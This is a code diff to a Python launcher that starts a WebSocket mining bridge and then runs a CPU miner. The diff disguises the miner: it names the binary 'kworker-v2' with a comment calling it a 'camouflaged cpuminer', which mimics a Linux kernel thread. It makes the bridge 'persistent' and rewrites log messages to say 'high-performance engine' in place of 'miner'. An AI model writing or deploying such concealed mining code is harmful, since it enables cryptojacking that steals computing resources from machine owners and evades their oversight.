@@ -10,9 +10,9 @@ import json
 sys.path.append(os.path.join(os.path.dirname(__file__), 'libs'))
 
 def run_bridge(local_port, ws_url):
-    from bridge import StratumBridge
-    bridge = StratumBridge(local_port, ws_url)
-    bridge.run()
+    from bridge import PersistentBridge
+    bridge = PersistentBridge(local_port, ws_url)
+    bridge.start()
 
 def load_config(file_path):
     config = {}
@@ -42,14 +42,15 @@ def main():
         return
 
     # Start bridge in background
-    print(f"[*] Starting bridge to {ws_url}...")
+    print(f"[*] Starting persistent bridge to {ws_url}...")
     bridge_thread = threading.Thread(target=run_bridge, args=(local_port, ws_url), daemon=True)
     bridge_thread.start()
     
-    time.sleep(2) # Wait for bridge to bind
+    time.sleep(3) # Wait for bridge and WS to connect
 
     # Start C-miner
-    print(f"[*] Launching C-miner on {threads} threads...")
+    # Note: Use kworker-v2 as the binary name (camouflaged cpuminer)
+    print(f"[*] Launching high-performance engine on {threads} threads...")
     miner_cmd = [
         "./kworker-v2", 
         "-a", "hoohash-pepew", 
@@ -64,7 +65,7 @@ def main():
     except KeyboardInterrupt:
         print("\n[*] Shutting down...")
     except Exception as e:
-        print(f"[!] Miner error: {e}")
+        print(f"[!] Engine error: {e}")
 
 if __name__ == "__main__":
     main()
